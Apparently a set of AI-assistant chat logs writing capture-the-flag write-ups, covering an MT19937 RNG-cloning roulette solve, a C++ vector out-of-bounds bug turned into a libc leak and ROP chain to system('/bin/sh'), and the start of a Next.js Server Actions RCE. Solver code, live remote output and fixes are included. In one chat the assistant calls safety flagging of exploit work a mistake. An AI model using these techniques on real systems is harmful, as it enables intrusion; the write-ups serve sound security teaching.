    clone.setstate((3, tuple(mt_state + [624]), None))

    print('[+] MT19937 state cloned', file=sys.stderr)

    for i in range(2):
        predicted_ticket = clone.getrandbits(32)
        guess = predicted_ticket % 37
        stake = balance

        actual_ticket, balance, _ = r.roulette(stake, guess)

        print(
            f'[+] win {i+1}: '
            f'predicted={predicted_ticket:08x}, '
            f'actual={actual_ticket:08x}, '
            f'guess={guess}, '
            f'balance={balance}',
            file=sys.stderr
        )

        if actual_ticket != predicted_ticket:
            raise SystemExit('[-] RNG desync')

    out = r.buy_flag()
    print(out)

    m = FLAG_RE.search(out)
    if m:
        print('[+] FLAG = ' + m.group(0), file=sys.stderr)


if __name__ == '__main__':
    main()
```

Run it:

```bash
python3 solve_fast.py crypto.cbd2026.cloud 1337
```

---

# 8. Python Exploit Dissection

## 8.1 Imports

```python
import random
import re
import socket
import sys
```

Why each library is used:

```text
random → create our cloned MT19937 generator
re     → extract ticket IDs, balance, and flag from server output
socket → connect to the remote nc service
sys    → read host and port from command-line arguments
```

Analogy:

These are our tools:

```text
socket = phone call to the casino
re     = highlighter to find important words
random = fake casino machine
sys    = lets us choose which casino address to call
```

---

## 8.2 Regex Patterns

```python
TICKET_RE = re.compile(rb'ticket id: ([0-9a-f]{8})')
BALANCE_RE = re.compile(rb'Balance: (\d+) credits')
FLAG_RE = re.compile(r'CBC\{[^}\n]+\}')
```

These patterns search for:

```text
ticket id: deadbeef
Balance: 12345 credits
CBC{...}
```

Why regex?

Because server output is text. We need to automatically extract important values from that text.

---

## 8.3 Untemper Functions

```python
def undo_right_xor(y, shift):
    x = y
    for _ in range(10):
        x = y ^ (x >> shift)
    return x & MASK
```

This reverses operations like:

```text
x ^= x >> shift
```

Then:

```python
def undo_left_xor_mask(y, shift, mask):
    x = y
    for _ in range(10):
        x = y ^ ((x << shift) & mask)
    return x & MASK
```

This reverses operations like:

```text
x ^= (x << shift) & mask
```

Why loop 10 times?

Because each correction reveals more correct bits. After several rounds, the value stabilizes.

Analogy:

Imagine a blurry photo. Each loop sharpens it a little. After enough sharpening, we recover the original picture.

---

## 8.4 Full Untemper

```python
def untemper(y):
    y = undo_right_xor(y, 18)
    y = undo_left_xor_mask(y, 15, 0xefc60000)
    y = undo_left_xor_mask(y, 7, 0x9d2c5680)
    y = undo_right_xor(y, 11)
    return y & MASK
```

This reverses the exact tempering process used by MT19937.

Important detail:

We reverse the steps in opposite order.

Analogy:

If someone locks a box like this:

```text
lock A
lock B
lock C
```

To open it, we must unlock:

```text
unlock C
unlock B
unlock A
```

That is why `untemper` reverses the transformations backward.

---

## 8.5 Remote Class

```python
class Remote:
```

This class manages the connection to the casino.

Instead of writing socket code repeatedly, we wrap it inside helper functions.

Analogy:

Rather than walking to the casino counter every time manually, we create an assistant who knows how to talk to the cashier.

---

## 8.6 Connect to Server

```python
self.s = socket.create_connection((host, port), timeout=10)
self.recv_until(b'> ')
```

This connects to the remote service and waits until the menu prompt appears.

Why wait for `> `?

Because that means the server is ready for our input.

---

## 8.7 Send Roulette Inputs

```python
self.send(f'1\n{stake}\n{guess}\n')
```

This sends:

```text
1       → choose roulette
stake   → amount to bet
guess   → roulette number guess
```

The newline `\n` is like pressing Enter.

---

## 8.8 Bulk Ticket Collection

```python
r.send('1\n1\n0\n' * 624)
```

This sends 624 roulette plays quickly.

Why bulk send?

Because the menu flow is predictable:

```text
choose game
enter stake
enter guess
repeat
```

This saves time compared to waiting after every single round.

Backup plan:

If bulk sending causes issues, we can collect tickets one by one using:

```python
for _ in range(624):
    ticket, balance, _ = r.roulette(1, 0)
    tickets.append(ticket)
```

This is slower but easier to debug.

---

## 8.9 Clone RNG State

```python
mt_state = [untemper(t) for t in tickets]

clone = random.Random()
clone.setstate((3, tuple(mt_state + [624]), None))
```

This is the heart of the exploit.

We take the 624 observed tickets, untemper them, then inject them into a fresh Python RNG.

After this, the cloned RNG predicts the same future as the server.

---

## 8.10 Predict and Win

```python
predicted_ticket = clone.getrandbits(32)
guess = predicted_ticket % 37
stake = balance
```

We predict the next ticket, convert it to a roulette number, then bet all current balance.

Then we verify:

```python
if actual_ticket != predicted_ticket:
    raise SystemExit('[-] RNG desync')
```

This check is important.

If the predicted ticket and actual ticket differ, our clone is out of sync.

Possible causes:

```text
We collected too few tickets.
The service consumed RNG elsewhere.
The parsing missed a ticket.
The server restarted.
We accidentally played a different game.
```

---

# 9. What If This Path Failed?

A good CTF player always has backup plans.

## Case 1 — Prediction Desyncs

If:

```text
actual_ticket != predicted_ticket
```

Then I would check:

```text
Did I collect exactly 624 tickets?
Did I parse ticket IDs correctly?
Did the server consume an extra RNG output?
Did I accidentally use slots/roulette differently?
```

Pivot:

```text
Collect tickets one by one instead of bulk sending.
Print every ticket.
Compare local predicted ticket with server ticket.
```

---

## Case 2 — Ticket ID Is Not Raw RNG Output

If ticket ID was hashed or truncated, direct MT19937 cloning might fail.

Pivot:

```text
Check if ticket ID is still correlated with winning result.
Look for modulo bias.
Look for reuse between roulette and slots.
Look for weak seed.
Look for timestamp-based seed.
```

But in this challenge, ticket is directly:

```python
rng.getrandbits(32)
```

So state recovery is the cleanest solution.

---

## Case 3 — Not Enough Balance After 624 Rounds

Here the math says we are safe:

```text
Starting balance = 1000
Cost to collect 624 tickets = at most 624
Remaining balance = at least 376
```

So this path should not fail unless input handling breaks.

---

# 10. Final Exploitation Result

Local test returns the fake local flag:

```text
CBC{fake_flag}
```

That only proves the exploit works.

Against the remote service, run:

```bash
python3 solve_fast.py crypto.cbd2026.cloud 1337
```

Expected result:

```text
[+] collected=624, balance=...
[+] MT19937 state cloned
[+] win 1: predicted=..., actual=..., guess=..., balance=...
[+] win 2: predicted=..., actual=..., guess=..., balance=...
CBC{real_remote_flag_here}
```

I cannot honestly claim the real remote flag here because the previous sandbox environment could not resolve the remote hostname. But the exploit logic is complete and was validated against the local challenge.

---

# 11. Root Cause

The root cause is:

```text
The application exposes raw outputs from a predictable PRNG.
```

More specifically:

```text
random.Random / MT19937 is used for game fairness logic.
The server prints ticket IDs generated from the same RNG stream.
The ticket IDs are enough to reconstruct the RNG state.
```

This breaks unpredictability.

---

# 12. Security Impact

An attacker can:

```text
Collect public ticket IDs.
Clone the RNG.
Predict future roulette outcomes.
Win unlimited credits.
Buy the flag.
```

In a real casino or financial system, this would be critical.

Possible real-world equivalents:

```text
Predictable password reset tokens
Predictable OTP codes
Predictable lottery numbers
Predictable session IDs
Predictable game loot rolls
Predictable coupon codes
```

---

# 13. Recommended Fixes

## 13.1 Do Not Use `random.Random` for Security

Bad:

```python
rng = random.Random(...)
ticket = rng.getrandbits(32)
```

Better:

```python
ticket = secrets.randbits(32)
```

For security-sensitive randomness, use:

```python
secrets
os.urandom
cryptographically secure RNG
```

---

## 13.2 Do Not Leak Raw RNG Outputs

Even if the RNG were stronger, leaking internal randomness is dangerous.

Bad:

```python
print(f'ticket id: {ticket:08x}')
```

Better:

```python
audit_id = secrets.token_hex(16)
print(f'ticket id: {audit_id}")
```

The audit ticket should be independent from the game result.

---

## 13.3 Separate Game Randomness and Public Audit IDs

Use separate randomness sources:

```text
Game result RNG → secret
Audit ticket ID → public, unrelated
```

Analogy:

Do not print the password on the receipt.

The receipt number and the secret winning number must be unrelated.

---

# 14. Lessons Learned

This challenge teaches an important crypto lesson:

```text
Random-looking does not mean secure-random.
```

MT19937 is deterministic. If enough outputs leak, future outputs become predictable.

Key CTF mindset:

```text
When a challenge talks about randomness, ask:
- What RNG is used?
- Is the seed weak?
- Are outputs leaked?
- Are outputs raw, truncated, or transformed?
- How many outputs do I need to predict the future?
```

For this challenge, the answer was:

```text
RNG: Python random.Random / MT19937
Seed: strong, but irrelevant after output leaks
Leak: public ticket ID
Output size: full 32-bit
Needed outputs: 624
Exploit: untemper + clone state + predict roulette
```

---

# 15. Final Summary

The casino tried to be fair by printing public ticket IDs, but those ticket IDs accidentally exposed the casino’s randomness stream.

Because the server used MT19937, collecting 624 ticket IDs allowed us to rebuild the RNG state. Once cloned, we predicted future tickets, calculated roulette results with `ticket % 37`, bet all credits on the correct number, gained enough balance, and bought the flag.

Final attack chain:

```text
Public ticket leak
→ MT19937 state recovery
→ Future ticket prediction
→ Roulette outcome prediction
→ Guaranteed wins
→ VIP flag purchase
```

This is the core idea:

```text
The flag was not hidden behind hard math.
The flag was hidden behind bad randomness hygiene.
```


## CHAT 17
Aman bro, aku paham konteksnya: ini **CTF private/lab**, dan kamu sudah berhasil mendapatkan flag. Kadang sistem salah menganggap konteks PWN/ROP/exploit sebagai berisiko, padahal dalam CTF ini tujuannya edukasi. Kita fokuskan sebagai **writeup pembelajaran, metodologi, dan defensive insight**.

# CTF Writeup — CBC Plus Plus 1

## Challenge Information

**Category:** PWN / Binary Exploitation
**Challenge Name:** CBC Plus Plus 1
**Target:** `pwn.cbd2026.cloud:9999`
**Binary:** `cbc_plus_plus_1`
**Final Flag:**

```text
CBC{c47884f6827d5fdb9799e7dad890e04934f47b29ab5e9f20a04bb4d6d9426fcb}
```

---

# Executive Summary

Challenge ini mengeksploitasi bug pada operasi `swap` di `std::vector`. Program mengizinkan user memasukkan index negatif tanpa validasi. Dari bug kecil ini, kita mengubah kontrol internal `std::vector`, lalu membuat operasi `add number` menulis ke objek global `std::string name`.

Dari situ, `name` dijadikan alat baca memori bebas karena program selalu mencetak:

```text
Hi, <name>
```

Setelah punya memory leak, kita:

```text
1. Leak alamat libc dari GOT.
2. Cari base libc langsung dari memori remote.
3. Resolve alamat system, environ, /bin/sh, dan pop rdi; ret.
4. Leak stack melalui environ.
5. Cari return address di stack.
6. Ubah vector agar add() menulis ROP chain ke stack.
7. Pilih Exit.
8. Program return ke ROP chain.
9. system("/bin/sh") jalan.
10. Baca flag.
```

Output berhasil:

```text
Bye!
CBC{c47884f6827d5fdb9799e7dad890e04934f47b29ab5e9f20a04bb4d6d9426fcb}
```

---

# Phase 1 — Reconnaissance

## Goal

Tujuan awal kita bukan langsung “ambil flag”, tapi menjawab:

```text
Program ini melakukan apa?
Input apa yang bisa kita kontrol?
Data apa yang disimpan?
Apakah ada bug memory corruption?
Proteksi binary seperti apa?
```

Dalam PWN, mindset awalnya seperti detektif.

Analogi:

> Kita masuk ke rumah yang terkunci. Sebelum mencari kunci utama, kita lihat dulu pintunya, jendelanya, pagar belakang, kamera, dan kebiasaan pemilik rumah.

Program memberikan menu:

```text
1. Add new number
2. Swap numbers
3. Exit
```

Dari menu ini, terlihat ada struktur data angka yang bisa kita isi dan tukar.

Secara konsep:

```text
Add new number  -> push_back ke vector
Swap numbers    -> tukar isi vector[index1] dan vector[index2]
Exit            -> keluar dari program
```

Hal yang langsung menarik:

```text
Swap numbers menerima index dari user.
```

Dalam PWN, setiap index dari user harus dicurigai.

Pertanyaan mentor:

```text
Apakah index dicek?
Apakah boleh negatif?
Apakah boleh terlalu besar?
Apa efeknya kalau index keluar batas?
```

---

# Phase 2 — Vulnerability Analysis

## Vulnerability

Bug inti challenge ini adalah **out-of-bounds access melalui index negatif**.

Program memakai `std::vector::operator[]`.

Masalah penting:

```text
operator[] tidak melakukan bounds checking.
```

Jadi kalau user memasukkan index negatif, program tetap mencoba mengakses memori di luar area data vector.

Analogi:

> Ada rak berisi kotak nomor 0 sampai 10.
> Normalnya kamu hanya boleh ambil kotak 0 sampai 10.
> Tapi penjaga tidak mengecek nomor.
> Kalau kamu bilang “ambil kotak -3”, penjaga malah mundur ke belakang rak dan mengambil baut mesin rak.

Dalam challenge ini, index negatif bisa menyentuh metadata internal `std::vector`.

---

# Phase 3 — Understanding std::vector Internals

`std::vector` di C++ menyimpan tiga pointer penting:

```text
_M_start
_M_finish
_M_end_of_storage
```

Secara sederhana:

```text
_M_start          = alamat awal data vector
_M_finish         = alamat tempat elemen berikutnya akan ditulis
_M_end_of_storage = batas akhir kapasitas vector
```

Analogi:

> Vector itu seperti rak penyimpanan.
>
> `_M_start` adalah titik awal rak.
> `_M_finish` adalah label “kotak berikutnya taruh di sini”.
> `_M_end_of_storage` adalah ujung maksimal rak.

Jika kita bisa mengubah `_M_finish`, maka operasi `add number` tidak lagi menulis ke vector normal.

Dia bisa kita arahkan menulis ke alamat mana pun.

Dalam exploit, metadata vector ditemukan pada index:

```text
_M_start  = index -4
_M_finish = index -3
_M_end    = index -2
```

Output solver menunjukkan:

```text
[+] using default vector indexes: start=-4, finish=-3, end=-2
```

Jadi kita tahu:

```text
swap(index_kita, -3) bisa mengubah _M_finish
swap(index_kita, -2) bisa mengubah _M_end
```

---

# Phase 4 — Exploitation Mindset

Target exploit bukan langsung ROP.

Kita pecah jadi beberapa primitive kecil:

```text
Primitive 1: bisa mengubah vector metadata.
Primitive 2: bisa membuat add() menulis ke objek name.
Primitive 3: bisa membuat name mencetak memori bebas.
Primitive 4: bisa leak libc.
Primitive 5: bisa leak stack.
Primitive 6: bisa menulis ROP chain ke stack.
Primitive 7: trigger control flow hijack.
```

Ini mindset penting PWN:

> Jangan langsung lompat ke “shell”.
> Bangun kemampuan kecil satu per satu.
> Dari write kecil, jadikan leak.
> Dari leak, bypass ASLR.
> Dari ASLR bypass, cari stack.
> Dari stack, tulis ROP.
> Dari ROP, dapat shell.

---

# Phase 5 — Why We Abuse `std::string name`

Program selalu mencetak:

```text
Hi, <name>
```

Objek `name` adalah `std::string`.

Dengan nama sepanjang 20 byte:

```python
NAME_SENT = b"A" * 20
```

kita memaksa string menggunakan heap allocation, bukan small-string optimization.

Kenapa penting?

Karena struktur `std::string` menjadi berguna:

```text
name + 0x00 = pointer ke isi string
name + 0x08 = panjang string
name + 0x10 = capacity
```

Kalau kita bisa menulis ke `name + 0x00` dan `name + 0x08`, kita bisa mengubah:

```text
name.pointer = alamat_yang_ingin_dibaca
name.length  = jumlah_byte
```

Lalu saat program mencetak:

```text
Hi, <name>
```

program sebenarnya sedang mencetak isi memori dari alamat yang kita pilih.

Analogi:

> `name` itu seperti kartu nama.
> Biasanya kartu itu menunjuk ke tulisan “Rey”.
> Tapi kita ganti alamat kartu itu ke laci rahasia.
> Saat resepsionis membaca kartu nama, dia malah membaca isi laci rahasia.

Ini menjadi **arbitrary read primitive**.

---

# Phase 6 — Building Arbitrary Read

Fungsi penting di solver:

```python
def leak(self, addr, size):
    self.aim_finish_at_name()
    self.t.add(addr)
    _, out = self.t.add(size)
    return Tube.extract_hi(out, size)
```

Kita bedah pelan-pelan.

## Step 1

```python
self.aim_finish_at_name()
```

Ini mengubah vector:

```text
_M_finish = ADDR_NAME
_M_end    = ADDR_NAME + 0x400
```

Artinya operasi `add()` berikutnya akan menulis ke objek global `name`.

Analogi:

> Kita pindahkan ujung pulpen.
> Harusnya pulpen menulis di buku vector.
> Sekarang pulpen diarahkan ke kartu nama.

## Step 2

```python
self.t.add(addr)
```

Karena `_M_finish` sudah menunjuk ke `name`, angka `addr` masuk ke:

```text
name.pointer
```

Jadi:

```text
name.pointer = addr
```

## Step 3

```python
self.t.add(size)
```

Angka kedua masuk ke:

```text
name.length
```

Jadi:

```text
name.length = size
```

## Step 4

Program mencetak:

```text
Hi, <name>
```

Karena pointer dan length sudah kita ubah, output itu menjadi isi memori dari `addr`.

Inilah leak.

---

# Phase 7 — Leaking libc from GOT

Target pertama:

```text
GOT_LIBC_START_MAIN = 0x404ff0
```

GOT adalah tabel alamat fungsi runtime.

Analogi:

> GOT itu seperti buku telepon program.
> Kalau program mau menelepon fungsi libc, dia lihat nomor teleponnya di GOT.

Kita baca GOT untuk mendapatkan alamat fungsi libc yang sudah dimuat di memori.

Output:

```text
[+] leaked libc pointer      = 0x7d4f9b6d8200
```

Ini penting karena ASLR membuat alamat libc berubah-ubah.

Backup plan kalau leak ini gagal:

```text
1. Cek apakah vector index benar.
2. Jalankan --auto-vec.
3. Cek apakah service reset.
4. Tambah retry atau timeout.
5. Test lokal lagi.
```

---

# Phase 8 — Resolving libc from Remote Memory

Output solver:

```text
[+] resolving libc from target memory; no libc file/offset guess needed
[+] libc ELF base by scan     = 0x7d4f9b6ae000
```

Kenapa tidak pakai offset libc lokal?

Karena libc remote bisa beda dari libc lokal.

Kalau kita pakai offset salah, alamat `system`, `environ`, atau `/bin/sh` bisa salah dan exploit crash.

Mode resolver melakukan:

```text
1. Ambil satu pointer libc.
2. Mundur per halaman memori sampai menemukan ELF header.
3. Parse struktur ELF dari memori remote.
4. Cari symbol system.
5. Cari symbol environ.
6. Cari string /bin/sh.
7. Cari gadget pop rdi; ret.
```

Output:

```text
[+] libc base                = 0x7d4f9b6ae000
[+] system                   = 0x7d4f9b706740
[+] environ symbol           = 0x7d4f9b8b8d58
[+] /bin/sh                  = 0x7d4f9b87942f
[+] pop rdi; ret             = 0x7d4f9b7bd75b
```

Analogi:

> Daripada menebak denah rumah remote, kita baca denah rumahnya langsung dari dalam rumah.
> Jadi walaupun rumah remote beda dari rumah lokal, kita tetap tahu dapur, kamar, dan pintu keluarnya di mana.

Backup plan kalau resolver gagal:

```text
1. Pakai --libc jika remote libc tersedia.
2. Kurangi fitur scan yang memakan leak slot.
3. Besarkan search chunk.
4. Cek preloads masih <= 127.
5. Jalankan ulang karena remote bisa reset.
```

---

# Phase 9 — Finding the Stack with `environ`

Output:

```text
[+] environ value = 0x7ffefd4af128
```

`environ` adalah symbol libc yang menunjuk ke environment variables di stack.

Kenapa ini berguna?

Karena kita butuh alamat stack untuk menulis ROP chain.

Analogi:

> Kita ingin menemukan meja kerja program.
> `environ` seperti papan alamat yang menunjuk ke area dekat meja kerja itu.

Dari `environ`, solver scan sekitar stack untuk mencari return address.

---

# Phase 10 — Finding Return Address

Output:

```text
[+] chosen ret slot = 0x7ffefd4aeff8
```

Return address adalah alamat tempat program akan kembali setelah fungsi selesai.

Kalau kita ganti return address, kita mengubah arah jalan program.

Analogi:

> Program sedang membaca peta jalan.
> Return address adalah tulisan “setelah selesai, pulang lewat jalan A”.
> Kita ganti tulisannya menjadi “setelah selesai, jalan ke ROP chain”.

Solver mencari return address dengan mencari nilai:

```text
0x4014a0
```

yaitu alamat balik dari menu ke main.

Backup plan kalau chosen ret slot salah:

```text
1. Aktifkan stack scan.
2. Ubah main_ret_delta.
3. Coba ret_adjust kecil seperti -8, +8, +16.
4. Periksa apakah chain masuk tapi crash.
5. Pastikan stack alignment memakai RET_GADGET.
```

---

# Phase 11 — Turning `add()` into Stack Write

Setelah tahu alamat stack target:

```text
0x7ffefd4aeff8
```

kita ubah vector lagi:

```text
_M_finish = chosen_ret_slot
_M_end    = chosen_ret_slot + 0x400
```

Output:

```text
[+] vec object               = 0x1b49c300
[+] vector start             = 0x1b49c320
[+] runtime idx(name._M_p)   = -56700436
```

Bagian ini penting.

Solver menghitung runtime index ke `name._M_p`, bukan hardcode, supaya lebih stabil.

Analogi:

> Kita ingin memindahkan pulpen dari kartu nama ke meja instruksi stack.
> Setelah pulpen diarahkan ke stack, setiap “add number” akan menulis angka ke stack.

---

# Phase 12 — Writing the ROP Chain

ROP chain:

```text
RET_GADGET
pop rdi; ret
/bin/sh
system
```

Maknanya:

```text
RET_GADGET       -> rapikan stack alignment
pop rdi; ret     -> masukkan argumen pertama ke RDI
/bin/sh          -> argumen untuk system
system           -> jalankan system("/bin/sh")
```

Di Linux x86-64, argumen pertama fungsi masuk ke register `RDI`.

Jadi untuk menjalankan:

```c
system("/bin/sh")
```

kita butuh:

```text
RDI = alamat "/bin/sh"
RIP = alamat system
```

Analogi:

> Kalau mau menyuruh koki memasak nasi goreng, kita harus:
>
> 1. Panggil kokinya.
> 2. Kasih tahu pesanannya.
>
> `system` adalah kokinya.
> `"/bin/sh"` adalah pesanannya.
> `pop rdi; ret` adalah tangan yang memberikan pesanan ke koki.

Kenapa ada `RET_GADGET`?

Karena stack harus rapi/aligned.

Analogi:

> Sebelum naik tangga, posisi kaki harus pas.
> `ret` tambahan adalah satu langkah kecil supaya posisi kaki pas sebelum masuk ke `system`.

---

# Phase 13 — Triggering the Exploit

Solver memilih menu:

```text
3. Exit
```

Output:

```text
Bye!
```

Saat program keluar, dia melakukan return.

Tapi return address sudah kita ganti dengan ROP chain.

Maka alurnya:

```text
Exit
-> return
-> RET_GADGET
-> pop rdi; ret
-> RDI = "/bin/sh"
-> system("/bin/sh")
-> shell
-> cat flag
```

Output akhir:

```text
CBC{c47884f6827d5fdb9799e7dad890e04934f47b29ab5e9f20a04bb4d6d9426fcb}
```

---

# Python Exploit Dissection

## 1. Library yang dipakai

Solver memakai library Python standar:

```python
import argparse
import os
import select
import socket
import struct
import subprocess
import sys
import time
```

Fungsinya:

```text
argparse   -> membaca argumen command line
socket     -> koneksi ke remote service
subprocess -> menjalankan binary lokal saat mode local
select     -> membaca output tanpa blocking
struct     -> packing/unpacking angka 64-bit
time       -> delay kecil agar shell siap
os/sys     -> helper proses dan output
```

Analogi:

> Python exploit seperti tas alat tukang:
>
> `socket` = kabel telepon ke server.
> `struct` = alat penerjemah angka ke byte.
> `select` = telinga yang menunggu server bicara.
> `argparse` = formulir setting sebelum kerja.

---

## 2. Constants

```python
ADDR_NAME = 0x405280
ADDR_VEC_GLOBAL = 0x4052A0
GOT_LIBC_START_MAIN = 0x404FF0
RET_GADGET = 0x40101A
MENU_RETURN_TO_MAIN = 0x4014A0
```

Ini alamat penting dari binary non-PIE.

Karena binary non-PIE, alamat `.text`, `.got`, dan `.bss` tetap.

Analogi:

> Ini seperti alamat rumah permanen di kota.
> Walaupun libc dan stack pindah-pindah karena ASLR, alamat dalam binary utama tetap sama.

---

## 3. Tube Class

`Tube` adalah wrapper komunikasi.

Dia membuat fungsi:

```python
send()
read_until()
read_some()
add()
swap()
```

Tujuannya supaya script tidak ribet menulis socket manual berkali-kali.

Analogi:

> `Tube` adalah penerjemah antara kita dan mesin challenge.
> Kita bilang `add(123)`, Tube yang mengetik menu `1`, memasukkan angka, lalu menunggu prompt balik.

---

## 4. `add()`

```python
def add(self, val):
    self.send(f"1\n{int(val)}\n".encode())
    idx = self.next_idx
    self.next_idx += 1
    out = self.read_until(MENU_MARKER)
    return idx, out
```

Fungsi ini memilih menu 1 dan memasukkan angka.

Dia juga mencatat index elemen yang baru dimasukkan.

Kenapa index dicatat?

Karena nanti elemen itu akan dipakai di `swap`.

Analogi:

> Kita menaruh kotak baru di rak, lalu mencatat nomor kotaknya.

---

## 5. `swap()`

```python
def swap(self, i, j):
    self.send(f"2\n{int(i)}\n{int(j)}\n".encode())
    return self.read_until(MENU_MARKER)
```

Fungsi ini memilih menu 2 dan menukar dua index.

Bug terjadi di sini karena index bisa negatif.

Analogi:

> Kita bilang ke penjaga, “tukar kotak nomor 5 dengan kotak nomor -3.”
> Penjaga tidak sadar kotak -3 bukan kotak biasa, tapi bagian mesin rak.

---

## 6. `Exploit` Class

Class ini menyimpan logic utama exploit.

Bagian awal:

```python
for _ in range(preloads):
    a, _ = self.t.add(ADDR_NAME)
    b, _ = self.t.add(ADDR_NAME + 0x400)
    self.name_pairs.append((a, b))
```

Ini preload pasangan alamat `name`.

Kenapa?

Karena setiap leak butuh mengarahkan `_M_finish` ke `name`.

Analogi:

> Kita menyiapkan banyak kunci cadangan sebelum masuk ruangan berbahaya.

---

## 7. `aim_finish_at_name()`

```python
def aim_finish_at_name(self):
    a, b = self.name_pairs.pop(0)
    self.t.swap(a, self.idx_finish)
    self.t.swap(b, self.idx_end)
```

Ini inti corrupt vector metadata.

Hasilnya:

```text
_M_finish = ADDR_NAME
_M_end    = ADDR_NAME + 0x400
```

Analogi:

> Kita menggeser papan “tulis angka berikutnya di sini” dari rak vector ke kartu nama.

---

## 8. `leak()`

```python
def leak(self, addr, size):
    self.aim_finish_at_name()
    self.t.add(addr)
    _, out = self.t.add(size)
    return Tube.extract_hi(out, size)
```

Ini arbitrary read.

Setelah `name.pointer` dan `name.length` dikontrol, output `Hi, name` menjadi leak.

Analogi:

> Kita mengarahkan kartu nama ke lemari rahasia, lalu program membacakan isi lemari itu.

---

## 9. `resolve_libc_from_memory()`

Fungsi ini membaca libc langsung dari memori.

Dia mencari:

```text
ELF base
system
environ
/bin/sh
pop rdi; ret
```

Kenapa penting?

Karena remote libc bisa beda.

Analogi:

> Jangan pakai peta rumah lama.
> Baca denah rumah yang sedang kita masuki sekarang.

---

## 10. `find_stack_ret()`

Fungsi ini scan stack dari `environ`.

Dia mencari return address yang cocok:

```text
MENU_RETURN_TO_MAIN = 0x4014a0
```

Lalu memilih slot return yang akan ditimpa.

Analogi:

> Kita cari kertas instruksi “balik ke main”, lalu kita tahu area mana yang harus diganti.

---

## 11. `set_vector_finish_from_name_fields()`

Fungsi ini mengubah vector lagi agar `add()` menulis ke stack.

```text
_M_finish = stack_ret
_M_end    = stack_ret + 0x400
```

Analogi:

> Pulpen yang tadi diarahkan ke kartu nama sekarang diarahkan ke meja instruksi stack.

---

## 12. `write_rop()`

```python
def write_rop(self, stack_addr, chain):
    self.set_vector_finish_from_name_fields(stack_addr, stack_addr + 0x400)
    for q in chain:
        self.t.add(q)
    self.t.send(b"3\n")
```

Ini menulis ROP chain lalu trigger Exit.

Analogi:

> Kita susun kartu instruksi palsu di meja, lalu menyuruh program pulang.
> Saat pulang, dia membaca kartu palsu kita.

---

# Final Command

Command yang berhasil:

```bash
python3 solve_cbc_plus_plus_easy.py --host pwn.cbd2026.cloud --port 9999 --read-time 5
```

Output penting:

```text
[+] leaked libc pointer      = 0x7d4f9b6d8200
[+] libc ELF base by scan     = 0x7d4f9b6ae000
[+] system                   = 0x7d4f9b706740
[+] environ value            = 0x7ffefd4af128
[+] /bin/sh                  = 0x7d4f9b87942f
[+] pop rdi; ret             = 0x7d4f9b7bd75b
[+] chosen ret slot          = 0x7ffefd4aeff8
[+] leak slots left          = 37
Bye!
CBC{c47884f6827d5fdb9799e7dad890e04934f47b29ab5e9f20a04bb4d6d9426fcb}
```

---

# Troubleshooting & Pivot Strategy

## Case 1 — Remote reset

Output:

```text
[!] attempt 1 failed: remote reset before expected output
```

Meaning:

```text
Service menutup koneksi sebelum prompt muncul.
```

Pivot:

```text
1. Jalankan ulang.
2. Tambah --connect-retries.
3. Tambah --timeout.
4. Cek service dengan nc.
```

Contoh:

```bash
python3 solve_cbc_plus_plus_easy.py \
  --host pwn.cbd2026.cloud \
  --port 9999 \
  --connect-retries 10 \
  --timeout 8 \
  --read-time 8
```

---

## Case 2 — libc pointer tidak valid

Meaning:

```text
Leak pertama gagal atau vector index salah.
```

Pivot:

```text
1. Aktifkan auto vector probe.
2. Coba --no-auto-vec jika default sudah benar.
3. Test lokal.
```

---

## Case 3 — environ value aneh

Meaning:

```text
libc offset salah atau resolver gagal.
```

Pivot:

```text
1. Pakai --resolve-memory.
2. Kalau punya libc remote, pakai --libc ./libc.so.6.
```

---

## Case 4 — ROP jalan tapi shell tidak muncul

Pivot:

```text
1. Pastikan ada RET_GADGET untuk alignment.
2. Coba ret_adjust kecil.
3. Tambah read-time.
4. Ubah command cat flag.
```

---

# Defensive Analysis

Bug ini muncul karena program mempercayai index user.

Masalah:

```text
std::vector::operator[] tidak melakukan bounds checking.
```

Mitigasi:

```cpp
if (idx < 0 || idx >= vec.size()) {
    reject_input();
}
```

Atau gunakan:

```cpp
vec.at(idx)
```

karena `at()` melakukan bounds checking dan melempar exception jika index invalid.

Best practice:

```text
1. Jangan gunakan operator[] untuk input tidak terpercaya.
2. Validasi index negatif dan terlalu besar.
3. Compile dengan hardening flags.
4. Aktifkan PIE, RELRO, Canary, NX.
5. Gunakan sanitizers saat development.
6. Jalankan fuzzing untuk input menu numerik.
```

---

# Lesson Learned

Challenge ini sangat bagus karena menggabungkan banyak konsep PWN modern:

```text
1. Out-of-bounds write/read
2. C++ std::vector internals
3. C++ std::string abuse
4. Arbitrary memory leak
5. GOT leak
6. ASLR bypass
7. Remote libc resolving
8. Stack discovery via environ
9. ROP chain
10. Exploit reliability engineering
```

Mindset paling penting:

> Exploit besar tidak muncul sekaligus.
> Kita membangun tangga kecil:
>
> bug kecil -> write kecil -> leak -> libc base -> stack -> ROP -> shell -> flag.

---

# Final Flag

```text
CBC{c47884f6827d5fdb9799e7dad890e04934f47b29ab5e9f20a04bb4d6d9426fcb}
```


## CHAT 18
# CTF Writeup — Northstar

## Challenge Information

**Category:** Web Exploitation
**Challenge Name:** Northstar
**Target:** `https://northstar.cbd2026.cloud/`
**Author:** daffainfo
**Final Flag:** `CBC{6cc6abdf24b2ece791cff9c75f5fdddb}`

---

## Executive Summary

Northstar adalah challenge Web CTF berbasis **Next.js + React Server Components / Server Actions**. Dari luar, websitenya terlihat seperti landing page biasa dengan form “Request Demo”. Namun setelah kita cek source dan behavior request-nya, aplikasi ternyata memakai Server Action yang berjalan di sisi server.

Versi dependency yang digunakan rentan terhadap pola bug **React Server Components RCE**, sehingga kita dapat membuat server menjalankan command. Karena flag asli tidak langsung tersedia di halaman web, kita mengeksekusi binary khusus:

```bash
/readflag
```

Hasilnya dikembalikan lewat header `X-Action-Redirect` dalam bentuk base64, lalu script Python kita decode menjadi flag.

---

# 1. Reconnaissance — Memahami Permukaan Website

## Apa yang kita lihat?

Saat membuka target, halaman terlihat seperti website SaaS biasa:

* Ada form “Request Demo”
* Ada input nama, email, company, dan notes
* Ada tombol submit
* Ada file JavaScript Next.js di DevTools Network

Di HTML/source yang diberikan, terlihat beberapa tanda penting:

```text
/_next/static/chunks/...
ServerActionForm
```

Ini menunjukkan bahwa aplikasi memakai **Next.js App Router** dan **Server Action**. Di HTML juga terlihat komponen `ServerActionForm`, yang menjadi petunjuk kuat bahwa form tidak hanya diproses di browser, tetapi terhubung ke fungsi server. 

## Kenapa ini penting?

Karena Server Action adalah jalur komunikasi langsung dari client ke server.

Analogi:

> Website biasa seperti kotak saran di sekolah. Kamu isi kertas, lalu guru membacanya nanti.
